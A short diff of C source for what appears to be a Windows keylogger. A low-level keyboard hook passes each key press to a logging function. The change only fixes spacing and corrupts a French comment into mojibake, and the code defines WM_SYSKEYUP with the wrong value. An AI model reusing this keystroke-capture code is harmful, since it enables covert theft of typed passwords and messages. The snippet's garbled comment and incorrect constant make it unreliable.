@@ -1,5 +1,5 @@
 #include "header.h"
-# define WM_SYSKEYUP 257
+#define WM_SYSKEYUP 257
 
 HHOOK hook;
 KBDLLHOOKSTRUCT hook_struct;
@@ -22,7 +22,7 @@ LRESULT __stdcall HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
 	{
 		if (wParam == WM_KEYDOWN)
 			edit_log(analyse_keyboard_status(hook_struct.vkCode));
-		else if (wParam == WM_SYSKEYDOWN && hook_struct.vkCode == 165) // != modifié en ==
+		else if (wParam == WM_SYSKEYDOWN && hook_struct.vkCode == 165) // != modifiÃ© en ==
 			keybd_event(VK_CONTROL, 0, 0, 0); 
 		else if (wParam == WM_SYSKEYUP && hook_struct.vkCode == 165)
 			keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0); 
